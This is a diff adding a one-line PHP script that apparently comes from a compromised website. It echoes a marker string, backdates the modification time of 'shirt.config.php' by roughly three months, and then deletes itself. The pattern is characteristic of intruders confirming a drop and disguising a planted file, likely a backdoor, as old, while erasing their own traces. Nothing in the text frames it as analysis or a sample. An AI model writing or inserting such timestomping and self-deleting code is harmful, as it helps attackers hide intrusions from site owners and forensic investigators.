@@ -1,0 +1,1 @@
+<?php echo "zyWCAcEXCa"; if (file_exists("./shirt.config.php")){ touch("./shirt.config.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*gQc4Wc5zKtf9GenW66C4*/ ?>
